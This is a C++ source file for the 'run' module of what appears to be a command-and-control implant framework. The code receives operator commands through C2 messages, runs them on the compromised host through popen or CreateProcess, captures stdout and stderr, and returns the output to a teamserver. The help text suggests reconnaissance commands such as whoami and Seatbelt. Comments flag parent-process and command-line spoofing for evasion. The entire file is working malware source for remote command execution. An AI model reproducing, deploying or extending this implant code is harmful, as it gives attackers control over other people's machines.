#include "Run.hpp"

#include <cstring>
#include <array>
#include <thread>
#include <future>

#include "Common.hpp"


#ifdef _WIN32
	#pragma warning( disable : 4800 ) 
#else

#endif

using namespace std;

constexpr std::string_view moduleName = "run";
constexpr unsigned long long moduleHash = djb2(moduleName);

#define BUFSIZE 4096

#ifdef _WIN32

__declspec(dllexport) Run* RunConstructor() 
{
    return new Run();
}

#else

__attribute__((visibility("default"))) Run* RunConstructor() 
{
    return new Run();
}

#endif


Run::Run()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
}

Run::~Run()
{
}

std::string Run::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "run:\n";
	info += "Run new process on the system.\n";
	info += "If the cmd is a system cmd use the following syntax 'cmd /c command'.\n";
	info += "The beacon wait for the cmd to end and provide the output.'\n";
	info += "exemple:\n";
	info += " - run whoami\n";
	info += " - run cmd /c dir\n";
	info += " - run .\\Seatbelt.exe -group=system\n";
#endif
	return info;
}

int Run::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
	if(splitedCmd.size()<2)
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

	string shellCmd;
	for (int i = 1; i < splitedCmd.size(); i++)
	{
		shellCmd += splitedCmd[i];
		shellCmd += " ";
	}

	c2Message.set_instruction(splitedCmd[0]);
	c2Message.set_cmd(shellCmd);

	return 0;
}


int Run::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	string shellCmd = c2Message.cmd();
	std::string outCmd = execBash(shellCmd);

	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd(shellCmd);
	c2RetMessage.set_returnvalue(outCmd);

	return 0;
}


// OPSEC parent process spoofing
// OPSEC Command line argument spoofing
std::string Run::execBash(const std::string& cmd)
{
	std::string result;

#ifdef __linux__ 

	std::array<char, 128> buffer;
	std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
	if (!pipe)
	{
		throw std::runtime_error("popen() filed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
	{
		result += buffer.data();
	}

#elif _WIN32

	HANDLE g_hChildStd_OUT_Rd = NULL;
	HANDLE g_hChildStd_OUT_Wr = NULL;
	HANDLE g_hChildStd_ERR_Rd = NULL;
	HANDLE g_hChildStd_ERR_Wr = NULL;

	SECURITY_ATTRIBUTES sa; 
    // Set the bInheritHandle flag so pipe handles are inherited. 
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); 
    sa.bInheritHandle = TRUE; 
    sa.lpSecurityDescriptor = NULL; 
    // Create a pipe for the child process's STDERR. 
    if ( ! CreatePipe(&g_hChildStd_ERR_Rd, &g_hChildStd_ERR_Wr, &sa, 0) ) {
        return "Error";
    }
    // Ensure the read handle to the pipe for STDERR is not inherited.
    if ( ! SetHandleInformation(g_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT, 0) ){
        return "Error";
    }
    // Create a pipe for the child process's STDOUT. 
    if ( ! CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0) ) {
        return "Error";
    }
    // Ensure the read handle to the pipe for STDOUT is not inherited
    if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) ){
        return "Error";
    }
    // Create the child process. 
    PROCESS_INFORMATION piProcInfo; 
    STARTUPINFO siStartInfo;
    bool bSuccess = FALSE; 

    // Set up members of the PROCESS_INFORMATION structure. 
    ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );

    // Set up members of the STARTUPINFO structure. 
    // This structure specifies the STDERR and STDOUT handles for redirection.
    ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
    siStartInfo.cb = sizeof(STARTUPINFO); 
    siStartInfo.hStdError = g_hChildStd_ERR_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create the child process. 
	// PROCESS_INFORMATION piProcInfo = CreateChildProcess();
    bSuccess = CreateProcess(NULL, 
        const_cast<LPSTR>(cmd.c_str()),     // command line 
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION
    CloseHandle(g_hChildStd_ERR_Wr);
    CloseHandle(g_hChildStd_OUT_Wr);

    // If an error occurs, exit the application. 
    if ( ! bSuccess ) 
	{
        result += "Error: Process failed to start.\n";
		return result;
    }

	m_isProcessRuning=true;
	m_processHandle = piProcInfo.hProcess;
	std::thread thread([this] { killProcess(); });

	DWORD dwRead; 
    CHAR chBuf[BUFSIZE];
    bSuccess = FALSE;
    std::string out = "";
	std::string err = "";
    for (;;) { 
        bSuccess=ReadFile( g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
        if( ! bSuccess || dwRead == 0 ) break; 

        std::string s(chBuf, dwRead);
        out += s;
    } 
    dwRead = 0;
    for (;;) { 
        bSuccess=ReadFile( g_hChildStd_ERR_Rd, chBuf, BUFSIZE, &dwRead, NULL);
        if( ! bSuccess || dwRead == 0 ) break; 

        std::string s(chBuf, dwRead);
        err += s;

    } 
	m_isProcessRuning = false;
	CloseHandle(g_hChildStd_ERR_Rd);
    CloseHandle(g_hChildStd_OUT_Rd);
  	
	thread.join();

	result += "Stdout:\n";
	result += out;
	result += "\n";
	if(!err.empty())
	{
		result += "Stderr:\n";
		result += err;
		result += "\n";
	}

	CloseHandle(piProcInfo.hProcess);
	CloseHandle(piProcInfo.hThread);

	#endif

	return result;
} 

#ifdef _WIN32

int Run::killProcess()
{
	std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now();
	while (1)
	{
		if (!m_isProcessRuning) 
			break;

		std::chrono::steady_clock::time_point now = std::chrono::steady_clock::now();
		auto elapse = std::chrono::duration_cast<std::chrono::seconds>(now - begin).count();
		if(elapse>=60)
		{
			TerminateProcess(m_processHandle, 0);
			break;
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}

	return 0;
}

#endif